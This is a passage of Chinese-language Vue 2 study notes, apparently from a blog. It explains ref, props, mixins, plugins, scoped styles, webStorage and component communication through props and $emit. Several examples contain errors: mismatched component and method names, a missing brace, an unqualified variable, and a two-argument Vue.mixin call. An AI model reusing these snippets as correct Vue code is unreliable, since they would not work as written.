class="line"><span class="comment">&lt;!-- 开启移动端的理想视口 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置页签图标 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入第三方样式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;css/bootstrap.css&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置网页标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>硅谷系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 被用来给元素或子组件注册引用信息（id的替代者）</span><br><span class="line">2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</span><br><span class="line">3. 使用方式：</span><br><span class="line">1. 打标识：```<span class="tag">&lt;<span class="name">h1</span> <span class="attr">ref</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>``` 或 ```<span class="tag">&lt;<span class="name">School</span> <span class="attr">ref</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span>```</span><br><span class="line">2. 获取：```this.$refs.xxx```</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">console.log(this.$refs.title) //真实DOM元素</span><br></pre></td></tr></table></figure><h1 id="props配置项"><a href="#props配置项" class="headerlink" title="props配置项"></a>props配置项</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1. 功能：让组件接收外部传过来的数据。外部传递过来的数据，应该写在使用组件的标签中</span><br><span class="line"></span><br><span class="line">2. 传递数据：<span class="tag">&lt;<span class="name">Student</span> <span class="attr">name</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">:age</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">sex</span>=<span class="string">&quot;xxx&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">3. 接收数据：</span><br><span class="line"></span><br><span class="line">1. 第一种方式（简单声明接收）：props:[&#x27;name&#x27;,&#x27;age&#x27;,...] </span><br><span class="line"></span><br><span class="line">2. 第二种方式（限制类型）：props:&#123;name:String,age:Number,...&#125;</span><br><span class="line"></span><br><span class="line">3. 第三种方式（限制类型、限制必要性、指定默认值）required和default不能一起写在一起：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    props:&#123;</span><br><span class="line">        name:&#123;</span><br><span class="line"><span class="javascript">            type:<span class="built_in">String</span>, <span class="comment">//类型</span></span></span><br><span class="line"><span class="javascript">                required:<span class="literal">true</span>, <span class="comment">//必要性</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">            age:&#123;</span><br><span class="line"><span class="javascript">                type:<span class="built_in">Number</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">default</span>:<span class="number">33</span><span class="comment">//默认值</span></span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">备注：</span><br><span class="line">props是只读的，Vue底层会监测你对props的修改。</span><br><span class="line">如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容赋值给一个变量到data中一份，然后去修改data中的数据。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    props:[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        myName:<span class="built_in">this</span>.name</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="mixin-混入"><a href="#mixin-混入" class="headerlink" title="mixin(混入)"></a>mixin(混入)</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">1. 功能：可以把多个组件共同的配置提取成一个混入对象</span><br><span class="line"></span><br><span class="line">2. 使用方式：</span><br><span class="line">创建mixin（名字可以任意取）.js文件，第一步定义混合：</span><br><span class="line">&#123;</span><br><span class="line">data()&#123;....&#125;,</span><br><span class="line">methods:&#123;....&#125;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">第二步使用混入：</span><br><span class="line">全局混入：```Vue.mixin(xxx)```</span><br><span class="line">局部混入：```mixins:[&#x27;xxx&#x27;]```</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">创建mixin.js文件</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">const</span> a = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;hello1&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">const</span> b = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;hello2&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">局部混入（在组件中）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> &#123;a,b&#125; <span class="keyword">from</span> <span class="string">&#x27;mixin.js&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;&#125;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        mixins:[a,b]</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">全局混入（在main.js文件中）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> &#123;a,b&#125; <span class="keyword">from</span> <span class="string">&#x27;mixin.js&#x27;</span></span></span><br><span class="line">    Vue.mixin(a,b)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">1. 功能：用于增强Vue</span><br><span class="line"></span><br><span class="line">2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</span><br><span class="line"></span><br><span class="line">3. 定义插件：</span><br><span class="line">创建plugin文件</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">install</span>(<span class="params">Vue,x,y,z</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(x,y,z)</span></span><br><span class="line"><span class="javascript">            <span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="javascript">            Vue.filter(<span class="string">&#x27;mySlice&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> value.slice(<span class="number">0</span>,<span class="number">4</span>)</span></span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//定义全局指令</span></span></span><br><span class="line"><span class="javascript">            Vue.directive(<span class="string">&#x27;fbind&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//指令与元素成功绑定时（一上来）</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">bind</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">                    element.value = binding.value</span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="comment">//指令所在元素被插入页面时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">inserted</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">                    element.focus()</span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                <span class="comment">//指令所在的模板被重新解析时</span></span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">update</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line">                    element.value = binding.value</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//定义混入</span></span></span><br><span class="line">            Vue.mixin(&#123;</span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line">                        x:100,</span><br><span class="line">                        y:200</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//给Vue原型上添加一个方法（vm和vc就都能用了）</span></span></span><br><span class="line"><span class="javascript">            Vue.prototype.hello = <span class="function">()=&gt;</span>&#123;alert(<span class="string">&#x27;你好啊&#x27;</span>)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">4. 在main.js文件使用插件：</span><br><span class="line">import plugin from &#x27;&#x27;</span><br><span class="line">Vue.use(plugin)</span><br><span class="line"></span><br><span class="line">5.在组件中使用插件的功能</span><br></pre></td></tr></table></figure><h1 id="scoped样式"><a href="#scoped样式" class="headerlink" title="scoped样式"></a>scoped样式</h1><p>提示：在打包编译时，所有的组件的样式是全部打包在一起的，为了防止样式名的冲突，可以使用scoped</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 作用：让样式在局部生效，防止冲突。</span><br><span class="line">2. 写法：&lt;style scoped&gt;</span><br></pre></td></tr></table></figure><h1 id="总结TodoList案例"><a href="#总结TodoList案例" class="headerlink" title="总结TodoList案例"></a>总结TodoList案例</h1><ol><li><p>组件化编码流程：</p><p>​    (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。</p><p>​    (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：</p><p>​            1).一个组件在用：放在组件自身即可。</p><p>​            2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</p><p>​    (3).实现交互：从绑定事件开始。</p></li><li><p>props适用于：</p><p>​    (1).父组件 ==&gt; 子组件 通信</p><p>​    (2).子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</p></li><li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p></li><li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol><h1 id="webStorage"><a href="#webStorage" class="headerlink" title="webStorage"></a>webStorage</h1><ol><li><p>存储内容大小一般支持5MB左右（不同浏览器可能还不一样）</p></li><li><p>浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。</p></li><li><p>相关API：</p><ol><li><p><code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);</code></p><pre><code>该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。</code></pre></li><li><p><code>xxxxxStorage.getItem(&#39;person&#39;);</code></p><p>​        该方法接受一个键名作为参数，返回键名对应的值。</p></li><li><p><code>xxxxxStorage.removeItem(&#39;key&#39;);</code></p><p>​        该方法接受一个键名作为参数，并把该键名从存储中删除。</p></li><li><p><code>xxxxxStorage.clear()</code></p><p>​        该方法会清空存储中的所有数据。</p></li></ol></li><li><p>备注：</p><ol><li>SessionStorage存储的内容会随着浏览器窗口关闭而消失。</li><li>LocalStorage存储的内容，需要手动清除才会消失。</li><li><code>xxxxxStorage.getItem(xxx)</code>如果xxx对应的value获取不到，那么getItem的返回值是null。</li><li><code>JSON.parse(null)</code>的结果依然是null。</li></ol></li></ol><h1 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h1><h3 id="通过props属性传递数据"><a href="#通过props属性传递数据" class="headerlink" title="通过props属性传递数据"></a>通过props属性传递数据</h3><h5 id="父组件-gt-子组件"><a href="#父组件-gt-子组件" class="headerlink" title="父组件===&gt;子组件"></a>父组件===&gt;子组件</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">===&gt;父组件&lt;===</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">MyHeader</span> <span class="attr">:selectList</span>=<span class="string">&quot;selectList&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> MyHeader <span class="keyword">from</span> <span class="string">&#x27;./components/MyHeader.vue&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&quot;App&quot;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 注册组件</span></span></span><br><span class="line">        components:&#123;MyHeader&#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line">                selectList:[]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">===&gt;子组件&lt;===</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;selectList&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&quot;MyHeader&quot;</span>,</span></span><br><span class="line"><span class="javascript">        props:[<span class="string">&quot;selectList&quot;</span>],</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>&#123;&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="子组件-gt-父组件"><a href="#子组件-gt-父组件" class="headerlink" title="子组件===&gt;父组件"></a>子组件===&gt;父组件</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">===&gt;父组件&lt;===</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">MyHeader</span> <span class="attr">:selectList</span>=<span class="string">&quot;selectList&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> MyHeader <span class="keyword">from</span> <span class="string">&#x27;./components/MyHeader.vue&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name:<span class="string">&quot;App&quot;</span>,</span></span><br><span class="line"><span class="javascript">  <span class="comment">// 注册组件</span></span></span><br><span class="line">  components:&#123;MyHeader&#125;,</span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span>&#123;&#125;</span></span><br><span class="line">  &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line"><span class="javascript">        <span class="comment">// e参数就是子组件传递过来的数据</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">selectList</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;子组件向父组件传递数据！&quot;</span>,e)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">===&gt;子组件&lt;===</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    name:<span class="string">&quot;MyHeader&quot;</span>,</span></span><br><span class="line"><span class="javascript">    props:[<span class="string">&quot;selectList&quot;</span>],</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>&#123;</span></span><br><span class="line">            selectListAdd:[]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.selectList(selectListAdd)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="通过-emit-传递数据"><a href="#通过-emit-传递数据" class="headerlink" title="通过$emit()传递数据"></a>通过$emit()传递数据</h3><ol><li><p>一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p></li><li><p>使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p></li><li><p>绑定自定义事件：</p><ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>  或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ===&gt;父组件&lt;=== --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Student</span> @<span class="attr">atguigu</span>=<span class="string">&quot;getStudentName&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Student <span class="keyword">from</span> <span class="string">&#x27;./components/Student&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">        components:&#123;School&#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                msg:<span class="string">&#x27;你好啊！&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">getSchoolName</span>(<span class="params">name</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;App收到了学校名：&#x27;</span>,name)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ===&gt;子组件&lt;=== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendStudentlName&quot;</span>&gt;</span>把学生名给App<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span 